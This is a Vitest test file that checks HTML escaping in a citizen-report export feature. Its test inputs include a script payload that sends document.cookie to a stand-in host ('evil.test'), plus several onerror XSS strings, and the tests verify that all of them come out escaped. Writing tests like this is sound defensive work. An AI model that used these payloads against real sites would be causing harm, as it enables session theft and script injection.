import { describe, expect, it } from 'vitest';
import { escapeHtml } from '../../src/lib/escapeHtml';
import { buildHTMLContent } from '../../src/lib/exportUtils';
import type { Report } from '../../src/types';

describe('escapeHtml', () => {
  it('escapes markup-significant characters', () => {
    expect(escapeHtml(`<img src=x onerror="alert('1')">&\``)).toBe(
      '&lt;img src=x onerror=&quot;alert(&#39;1&#39;)&quot;&gt;&amp;&#96;'
    );
  });

  it('treats null and undefined as empty and stringifies numbers', () => {
    expect(escapeHtml(null)).toBe('');
    expect(escapeHtml(undefined)).toBe('');
    expect(escapeHtml(42)).toBe('42');
  });
});

describe('report export document', () => {
  it('does not let citizen-written fields inject markup into the print window', () => {
    const hostile = '<script>fetch("//evil.test/?"+document.cookie)</script>';
    const html = buildHTMLContent(
      [
        {
          id: 'r1',
          title: hostile,
          description: `<img src=x onerror=alert(1)> ${hostile}`,
          category: 'Infrastrukturë',
          status: 'Pending Review',
          urgency: 'E lartë',
          createdAt: '2026-10-11T10:00:00.000Z',
          authorName: hostile,
          isAnonymous: false,
          location: { municipality: hostile, address: hostile, lat: 0, lng: 0 },
          images: ['https://x.test/a.png" onerror="alert(1)'],
        } as unknown as Report,
      ],
      'subtitle'
    );

    expect(html).not.toContain('<script>fetch');
    expect(html).not.toContain('<img src=x');
    expect(html).not.toContain('" onerror="alert(1)');
    expect(html).toContain('&lt;script&gt;');
  });
});
